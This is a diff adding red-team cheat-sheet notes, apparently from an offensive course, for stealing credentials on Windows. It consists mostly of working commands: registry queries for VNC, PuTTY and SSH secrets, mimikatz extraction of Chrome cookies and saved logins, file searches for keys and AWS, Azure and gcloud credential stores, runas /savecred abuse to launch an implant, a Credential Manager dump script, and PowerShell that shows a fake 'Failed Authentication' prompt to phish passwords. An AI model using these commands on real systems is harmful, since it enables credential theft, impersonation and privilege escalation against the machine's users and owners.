@@ -1,0 +1,73 @@
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+reg query "HKCU\Software\OpenSSH\Agent\Keys"
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s - to search for credentials in the registry
+
+
+
+
+
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" - using in mimikatz to find intresting cookies stored in chrome
+
+
+
+dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data - chrome credentials
+
+
+
+
+
+
+dir /b /a /s c:\ > dirs.txt
+type dirs.txt | findstr /i pass - to find files in c:/ which contains the word "pass"
+type dirs.txt | findstr /i ssh
+type dirs.txt | findstr /i kdbx
+type dirs.txt | findstr /i vnc
+Good targets:
+install, backup, .bak, .log, .bat, .cmd, .vbs, .cnf, .conf, .config, .ini, .xml, .txt, .gpg, .pgp, .p12, .der, .csr, .cer, id_rsa, id_dsa, .ovpn, .rdp, vnc, ftp, ssh, vpn, git, .kdbx, .db
+unattend.xml
+Unattended.xml
+sysprep.inf
+sysprep.xml
+VARIABLES.DAT
+setupinfo
+setupinfo.bak
+web.config
+SiteList.xml
+.aws\credentials
+.azure\accessTokens.json
+.azure\azureProfile.json
+gcloud\credentials.db
+gcloud\legacy_credentials
+gcloud\access_tokens.db
+
+
+
+
+
++ "A Boss with Creds" - Abusing Credential Manager
+---------------------------------------------------------
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+runas /savecred /user:admin c:\rto\lpe\implant\implant.exe
+runas /savecred /user:admin "c:\windows\system32\cmd /c dir /b /a /s c:\users\admin > c:\rto\admin.txt" - running process with save creds user ( because it would be a new pop up it is reccomended to use some beacon)
+
+
+
+
++ "The King is Naked" - Robbing Credential Manager
+---------------------------------------------------------
+powershell Import-Module c:\rto\lpe\cms.ps1 ; Enum-Creds - using this script will show us also the clear text passwords.
+
+
+
+
++ "A Thief" - Asking User for Creds
+---------------------------------------------------------
+powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password"
+
+
+
+powershell "$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'admin',[Environment]::UserDomainName); $cred.getnetworkcredential().password"
